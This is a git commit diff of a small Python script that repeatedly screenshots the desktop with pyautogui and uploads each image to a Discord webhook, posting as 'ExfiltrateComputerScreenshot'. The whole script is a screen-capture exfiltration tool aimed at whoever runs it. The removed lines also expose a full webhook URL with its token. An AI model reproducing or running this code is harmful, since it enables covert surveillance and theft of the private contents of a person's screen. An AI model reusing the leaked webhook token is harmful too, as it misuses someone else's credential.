b6f8acb0b06072743d95e5424efa0a137af447fa
katzenkreiter <johannes1353@gmail.com>
2025-04-17 13:01:05 +0200

    script.py

--- script.py
+++ script.py
@@ -2,37 +2,33 @@ import pyautogui
 from time import sleep
 import requests
 
-# Your webhook
-discord_webhook = "https://discord.com/api/webhooks/1356971307547361501/IGX0ZvQYPn7RFgYd6d7wpoL9xzCSL3EZ_VBjEzfimSs7eDidDMKHv12ncQmdgjOmWXVU"
 
+# YOUR DISCORD WEBHOOK
+discord_webhook = 
 
-# Settings
-SCREENSHOTS = 1
-TIMING = 10
+# Edit this variables as you want
+SCREENSHOTS = 10
+TIMING = 5
 
 for i in range(SCREENSHOTS):
     sleep(TIMING)
 
-    # Screenshot speichern
+    # take the screenshot
     screenshot = pyautogui.screenshot()
-    filename = f"screenshot_{i}.png"
-    screenshot.save(filename)
+    screenshot.save("screenshot.png")
 
-    with open(filename, "rb") as f:
-        files = {"file": (filename, f, "image/png")}
-        data = {
-            "username": "ExfiltrateComputerScreenshot",
-            "content": f"Screenshot #{i}"
-        }
+    with open("screenshot.png", "rb") as f:
+        foto = f.read()
 
-        response = requests.post(discord_webhook, data=data, files=files)
-
+    richiesta = {
+        "username": "ExfiltrateComputerScreenshot"
+    }
 
     # Send the message by attaching the photo
     response = requests.post(discord_webhook, data=richiesta, files={"Screen#"+str(i)+".png": foto})
 
     # Useful for debugging
-    if response.status_code == 200:
-        print("Photo successfully sent!")
-     else:
-         print("Error while submitting photo." + str(response.status_code))
+    # if response.status_code == 200:
+    #     print("Photo successfully sent!")
+    # else:
+    #     print("Error while submitting photo." + str(response.status_code))
